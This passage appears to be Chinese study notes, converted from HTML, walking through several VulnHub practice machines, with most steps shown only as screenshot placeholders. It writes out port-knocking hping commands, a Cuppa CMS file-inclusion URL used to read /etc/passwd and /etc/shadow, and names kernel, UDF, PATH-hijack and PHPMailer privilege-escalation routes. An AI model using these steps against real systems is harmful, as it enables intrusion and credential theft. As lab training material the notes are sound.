+<p>然后数据库好像还没登录过说不定有flag搜索config看看密码登录看看</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image223.png"
+style="width:5.19444in;height:3.5777in" alt="截图.png" /></p>
+<p>登录数据库成功寻找flag或者密码</p>
+<p>查看wordpress目录看看是否有密码好登录</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image224.png"
+style="width:2.36111in;height:2.84169in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image225.png"
+style="width:5.76042in;height:1.15425in" alt="截图.png" /></p>
+<p>爆破成功</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image226.png"
+style="width:2.875in;height:1.17708in" alt="截图.png" /></p>
+<p>网站没什么东西哎，直接su切换用户</p>
+<p>发现python文件sudo提权</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image227.png"
+style="width:5.76042in;height:0.82791in" alt="截图.png" /></p>
+<p>python 提权成功</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image228.png"
+style="width:5.76042in;height:0.4143in" alt="截图.png" /></p>
+<p><strong>LordOfTheRoot_1.0.1
+（端口碰撞,cc编译overlayfs提权）</strong></p>
+<p>信息搜集：使用nmap扫只有一个22端口</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image229.png"
+style="width:5.76042in;height:1.78772in" alt="截图.png" /></p>
+<p>连接提示容易的1，2，3</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image230.png"
+style="width:5.76042in;height:3.56869in" alt="截图.png" /></p>
+<p>没头绪百度说是端口碰撞，就像敲门如果敲门的频率不对就不让进，不开门（这个提示是敲1，2，3所以就使用hping3敲门）</p>
+<p>端口碰撞是一种通过在一组预先指定的关闭端口上产生连接请求，从外部打开防火墙上的端口的方法。一旦收到正确的连接请求序列，防火墙规则就会被动态修改，以允许发送连接请求的主机通过特定端口进行连接。</p>
+<p>端口碰撞的主要目的是防止攻击者通过进行端口扫描来扫描系统中潜在的可利用服务，因为除非攻击者发送正确的碰撞序列，否则受保护的端口将显示为关闭。</p>
+<p>hping -S 111.111.111.134 -c 1 -p 1</p>
+<p>hping -S 111.111.111.134 -c 1 -p 2</p>
+<p>hping -S 111.111.111.134 -c 1 -p 3</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image231.png"
+style="width:5.76042in;height:3.27765in" alt="截图.png" /></p>
+<p>门开了</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image232.png"
+style="width:5.76042in;height:2.41455in" alt="截图.png" /></p>
+<p>是个网页</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image233.png"
+style="width:5.76042in;height:4.5012in" alt="截图.png" /></p>
+<p>发现有bash64</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image234.png"
+style="width:5.76042in;height:2.2347in" alt="截图.png" /></p>
+<p>解密</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image235.png"
+style="width:5.59722in;height:0.44819in" alt="截图.png" /></p>
+<p>再解密</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image236.png"
+style="width:5.76042in;height:0.39352in" alt="截图.png" /></p>
+<p>发现登录页面</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image237.png"
+style="width:5.76042in;height:2.68472in" alt="截图.png" /></p>
+<p>扫后台发现并没有其他文件，估测是mysql数据库注入然后活动里面的用户密码然后进行提权</p>
+<p>果然是sql注入</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image238.png"
+style="width:5.76042in;height:3.29943in" alt="截图.png" /></p>
+<p>sql爆破半天直接去看博主的密码然后开始爆破ssh成功</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image239.png"
+style="width:5.76042in;height:1.66221in" alt="截图.png" /></p>
+<p>登录提权</p>
+<p>并没有其他用户说明就是这个用户提权</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image240.png"
+style="width:5.26389in;height:0.62541in" alt="截图.png" /></p>
+<p>使用脏牛提权好像不行</p>
+<p>看看内核提权</p>
+<p>使用这个37292.c</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image241.png"
+style="width:5.76042in;height:1.49107in" alt="截图.png" /></p>
+<p>内核提权失败</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image242.png"
+style="width:5.16667in;height:1.51042in" alt="截图.png" /></p>
+<p>只能试试overlayfs漏洞</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image243.png"
+style="width:5.76042in;height:1.70194in" alt="截图.png" /></p>
+<p>提权成功（用cc编译也是离谱）</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image244.png"
+style="width:4.40278in;height:1.65495in" alt="截图.png" /></p>
+<p><strong>RAVEN: 2(cve-2016-10033 UDF提权)</strong></p>
+<p>信息收集：使用nmap分析发现开了个高端口肯定也没啥用</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image245.png"
+style="width:5.76042in;height:2.52565in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image246.png"
+style="width:4.55556in;height:0.58378in" alt="截图.png" /></p>
+<p>使用nikto分析80端口发现版本号</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image247.png"
+style="width:5.76042in;height:3.66811in" alt="截图.png" /></p>
+<p>又是wordpress</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image248.png"
+style="width:5.76042in;height:3.26424in" alt="截图.png" /></p>
+<p>又要设置hosts</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image249.png"
+style="width:2.90278in;height:1.33174in" alt="截图.png" /></p>
+<p>出了用户</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image250.png"
+style="width:5.76042in;height:1.84103in" alt="截图.png" /></p>
+<p>吸取上次犯错经验现在就ssh和网站一起跑</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image251.png"
+style="width:5.76042in;height:2.37406in" alt="截图.png" /></p>
+<p>信息收集</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image252.png"
+style="width:5.76042in;height:5.50855in" alt="截图.png" /></p>
+<p>发现flag</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image253.png"
+style="width:5.76042in;height:1.45382in" alt="截图.png" /></p>
+<p>发现版本号</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image254.png"
+style="width:5.76042in;height:2.82327in" alt="截图.png" /></p>
+<p>可疑漏洞名字好像正好符合5.2.16</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image255.png"
+style="width:5.76042in;height:0.46577in" alt="截图.png" /></p>
+<p>使用msfconsole</p>
+<p>设置targeturi为/contact.php不然不会成功</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image256.png"
+style="width:5.76042in;height:0.86696in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image257.png"
+style="width:5.30556in;height:2.06385in" alt="截图.png" /></p>
+<p>反弹成功开始后渗透</p>
+<p>找数据库密码文件</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image258.png"
+style="width:5in;height:1.05208in" alt="截图.png" /></p>
+<p>发现数据库密码</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image259.png"
+style="width:4.02778in;height:2.09737in" alt="截图.png" /></p>
+<p>登录成功</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image260.png"
+style="width:5.76042in;height:2.19444in" alt="截图.png" /></p>
+<p>发现密码，接着爆破hash密码</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image261.png"
+style="width:5.76042in;height:2.33831in" alt="截图.png" /></p>
+<p>百度是udf提权</p>
+<p>搜索文件</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image262.png"
+style="width:5.76042in;height:2.44704in" alt="截图.png" /></p>
+<p>按照步骤使用</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image263.png"
+style="width:5.76042in;height:3.2163in" alt="截图.png" /></p>
+<p>此处失败多次</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image264.png"
+style="width:5.76042in;height:3.53315in" alt="截图.png" /></p>
+<p>成功（可能是因为要把那个1518.so的权限提上来才可以成功）</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image265.png"
+style="width:5.76042in;height:3.75515in" alt="截图.png" /></p>
+<p>提权成功</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image266.png"
+style="width:5.76042in;height:1.96492in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image267.png"
+style="width:5.76042in;height:1.60053in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image268.png"
+style="width:2.34722in;height:0.63636in" alt="截图.png" /></p>
+<p><strong>LIN.SECURITY: 1(nfs写私钥，nmap提权)</strong></p>
+<p>靶机给了给bob用户和密码<mark>secret进去看全是sudo提权可能是练习sudo提权的好靶机</mark></p>
+<p>信息收集：nmap扫描服务</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image269.png"
+style="width:5.76042in;height:2.81664in" alt="截图.png" /></p>
+<p>都不是后面端口</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image270.png"
+style="width:2.68056in;height:3.91132in" alt="截图.png" /></p>
+<p>就应该就nfs可以渗透了，试试看能不能直接使用共享目录看看有没有好东西</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image271.png"
+style="width:3.29167in;height:1.3125in" alt="截图.png" /></p>
+<p>使用mount 连接</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image272.png"
+style="width:5.56944in;height:2.67in" alt="截图.png" /></p>
+<p>可惜不是根目录，看起来有点像可以上传私钥然后ssh登录的感觉</p>
+<p>先生成.ssh目录</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image273.png"
+style="width:3.83333in;height:1.66667in" alt="截图.png" /></p>
+<p>生成不了</p>
+<p>看这些目录的权限好像是要用户为1001，用户组为1005的用户才能完全使用这个目录就可以创建.ssh</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image274.png"
+style="width:5.18056in;height:2.35575in" alt="截图.png" /></p>
+<p>创建一个perter用户然后再/etc/passwd里面修改UID和GID</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image275.png"
+style="width:5.76042in;height:1.38211in" alt="截图.png" /></p>
+<p>再切换用户创建.ssh文件夹成功</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image276.png"
+style="width:5.76042in;height:2.59983in" alt="截图.png" /></p>
+<p>然后生成并且上传公钥文件</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image277.png"
+style="width:5.76042in;height:0.56165in" alt="截图.png" /></p>
+<p>成功登录</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image278.png"
+style="width:5.76042in;height:2.21554in" alt="截图.png" /></p>
+<p>使用sudo -l发现一个没做过的sudo提权</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image279.png"
+style="width:5.76042in;height:0.7485in" alt="截图.png" /></p>
+<p>只能百度了</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image280.png"
+style="width:5.76042in;height:4.92304in" alt="截图.png" /></p>
+<p>提权成功，</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image281.png"
+style="width:5.5in;height:1.11458in" alt="截图.png" /></p>
+<p><strong>Sputnik: 1(git泄露，splunk渗透反弹，ed提权)</strong></p>
+<p>信息收集：使用nmap扫描发现这个用了splunk</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image282.png"
+style="width:5.76042in;height:5.61943in" alt="截图.png" /></p>
+<p>访问55555端口</p>
+<p>发现有个网页上面挂了个游戏而且不能抓包</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image283.png"
+style="width:5.76042in;height:3.88099in" alt="截图.png" /></p>
+<p>使用nikto发现有备份文件下载</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image284.png"
+style="width:5.76042in;height:2.16214in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image285.png"
+style="width:5.76042in;height:0.88926in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image286.png"
+style="width:5.76042in;height:1.26485in" alt="截图.png" /></p>
+<p>发现61337是splunk页面</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image287.png"
+style="width:5.76042in;height:1.8781in" alt="截图.png" /></p>
+<p>试试弱密码不行</p>
+<p>扫后台，搜寻用户和密码本或找splunk的版本号看看能不能直接日进去，可能那个游戏页面有密码之类的提示</p>
+<p>扫8089的https后台</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image288.png"
+style="width:5.26389in;height:2.14725in" alt="截图.png" /></p>
+<p>发现版本号</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image289.png"
+style="width:5.76042in;height:1.45774in" alt="截图.png" /></p>
+<p>并没有漏洞z</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image290.png"
+style="width:5.76042in;height:2.77522in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image291.png"
+style="width:5.76042in;height:0.67223in" alt="截图.png" /></p>
+<p>百度说是Git泄露</p>
+<p>使用git log -p</p>
+<p>查看日志</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image292.png"
+style="width:5.76042in;height:3.97829in" alt="截图.png" /></p>
+<p>一直回车看下面发现有密码</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image293.png"
+style="width:4.22222in;height:1.48038in" alt="截图.png" /></p>
+<p>这个靶机没有22端口要么是端口敲门要么就是直接反弹shell提权，这个靶机太靠互联网下载攻击软件了就不日了</p>
+<p><strong>w1r3s:（cuppa CMS加curl）</strong></p>
+<p>信息搜集</p>
+<p>发现用户名是Jan，还有一个数据库的端口，估计应该是要去网页找密码爆破之类的</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image294.png"
+style="width:5.76042in;height:3.85265in" alt="截图.png" /></p>
+<p>再先看看ftp吧</p>
+<p>把ftp里面的目录文件全下载下来查看</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image295.png"
+style="width:5.76042in;height:6.7764in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image296.png"
+style="width:5.76042in;height:1.52309in" alt="截图.png" /></p>
+<p>发现有几个好东西</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image297.png"
+style="width:5.76042in;height:5.34791in" alt="截图.png" /></p>
+<p>base64解密是</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image298.png"
+style="width:5.76042in;height:0.5898in" alt="截图.png" /></p>
+<p>发现员工名单</p>
+<p>The W1R3S.inc employee list</p>
+<p>Naomi.W - Manager</p>
+<p>Hector.A - IT Dept</p>
+<p>Joseph.G - Web Design</p>
+<p>Albert.O - Web Design</p>
+<p>Gina.L - Inventory</p>
+<p>Rico.D - Human Resources</p>
+<p>一直访问wordpress，跳转到localhost修改hosts让他跳回去</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image299.png"
+style="width:5.23611in;height:1.82534in" alt="截图.png" /></p>
+<p>终于找到登录页面</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image300.png"
+style="width:5.76042in;height:3.29274in" alt="截图.png" /></p>
+<p>登录网页发现 cuppa cms</p>
+<p>的应该网站初始化的样子，前提是输入对用户名和数据库的密码之类的说明要去找sql密码</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image301.png"
+style="width:5.76042in;height:4.05297in" alt="截图.png" /></p>
+<p>使用whatweb查看框架然后用查看有什么脚本可以利用</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image302.png"
+style="width:5.76042in;height:3.06579in" alt="截图.png" /></p>
+<p>发现了东西，可能就是那个初始化页面的漏洞套进去看看</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image303.png"
+style="width:5.76042in;height:2.18881in" alt="截图.png" /></p>
+<p>可惜这个套不了，可能是故意设置的所以我们使用什么的文件包含试试</p>
+<p>http://target/cuppa/alerts/alertConfigField.php?urlConfig</p>
+<p>http://172.16.123.110/administrator/alerts/alertConfigField.php?urlConfig</p>
+<p>使用还是不成功，可能是url编码问题使用curl测试一下</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image304.png"
+style="width:5.76042in;height:0.16044in" alt="截图.png" /></p>
+<p>成功包含/etc/passwd</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image305.png"
+style="width:5.76042in;height:5.28222in" alt="截图.png" /></p>
+<p>读取到shadow</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image306.png"
+style="width:5.76042in;height:4.08145in" alt="截图.png" /></p>
+<p>开始可以开始爆破了</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image307.png"
+style="width:2.63889in;height:0.53195in" alt="截图.png" /></p>
+<p>爆破成功</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image308.png"
+style="width:5.76042in;height:2.79638in" alt="截图.png" /></p>
+<p>ssh登录提权：</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image309.png"
+style="width:5.76042in;height:2.66219in" alt="截图.png" /></p>
+<p><strong>Nullbyte（ps环境变量提权）</strong></p>
+<p>信息收集：</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image310.png"
+style="width:5.76042in;height:2.28033in" alt="截图.png" /></p>
+<p>没发现什么特殊端口</p>
+<p>把主页照片保存下来strings发现有一串可疑字符</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image311.png"
+style="width:3.65278in;height:1.28369in" alt="截图.png" /></p>
+<p>base64解密失败，原来是网页路径</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image312.png"
+style="width:4.66667in;height:0.57292in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image313.png"
+style="width:5.76042in;height:0.86766in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image314.png"
+style="width:5.76042in;height:2.99574in" alt="截图.png" /></p>
+<p>爆破key成功</p>
+<p>登录试试</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image315.png"
+style="width:5.76042in;height:2.08118in" alt="截图.png" /></p>
+<p>发现是sql注入</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image316.png"
+style="width:5.76042in;height:2.62216in" alt="截图.png" /></p>
+<p>爆出密码</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image317.png"
+style="width:5.76042in;height:1.26083in" alt="截图.png" /></p>
+<p>使用phpmyadmin登录看看</p>
+<p>登录成功</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image318.png"
+style="width:5.76042in;height:2.83007in" alt="截图.png" /></p>
+<p>发现个base64的密码和用户</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image319.png"
+style="width:5.76042in;height:2.91869in" alt="截图.png" /></p>
+<p>解密发现可能是md5</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image320.png"
+style="width:5.76042in;height:0.45667in" alt="截图.png" /></p>
+<p>解密得到密码</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image321.png"
+style="width:5.76042in;height:1.98391in" alt="截图.png" /></p>
+<p>ssh服务登录成功查看/etc/passwd</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image322.png"
+style="width:4.56944in;height:1.15537in" alt="截图.png" /></p>
+<p>发现有其他用户也是bash有可能是要找其他的用户提权</p>
+<p>发现可疑文件有s</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image323.png"
+style="width:5.41667in;height:4.22917in" alt="截图.png" /></p>
+<p>使用发现是ps的命令，说明是环境变量提权</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image324.png"
+style="width:4.65278in;height:1.08495in" alt="截图.png" /></p>
+<p>写入提权命令</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image325.png"
+style="width:5.76042in;height:0.20106in" alt="截图.png" /></p>
+<p>然后给顶替的/tmp/ps设置777的权限</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image326.png"
+style="width:4.81944in;height:0.3435in" alt="截图.png" /></p>
+<p>把ps命令顶替在前面</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image327.png"
+style="width:5.76042in;height:0.4605in" alt="截图.png" /></p>
+<p>环境变量提权成功</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image328.png"
+style="width:5.76042in;height:0.85834in" alt="截图.png" /></p>
+<p><strong>Ch4inrulz（POST文件包含）</strong></p>
+<p>信息收集dirb扫后台，发现一个要密码登录的页面</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image329.png"
+style="width:5.33333in;height:2.42708in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image330.png"
+style="width:5.76042in;height:2.12563in" alt="截图.png" /></p>
+<p>由此可以分析要找到密码和用户才能进入</p>
+<p>发现可疑页面</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image331.png"
+style="width:5.76042in;height:2.231in" alt="截图.png" /></p>
+<p>发现可以传file参数</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image332.png"
+style="width:5.76042in;height:1.66138in" alt="截图.png" /></p>
+<p>get方式报错</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image333.png"
+style="width:5.76042in;height:2.50237in" alt="截图.png" /></p>
+<p>post方式可行</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image334.png"
+style="width:5.76042in;height:2.74034in" alt="截图.png" /></p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image335.png"
+style="width:5.76042in;height:4.5107in" alt="截图.png" /></p>
+<p>发现目录穿越</p>
+<p>测试发现index.html.bak</p>
+<p><img
+src="D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image336.png"
+style="width:5.76042in;height:1.51563in" alt="截图.png" /></p>
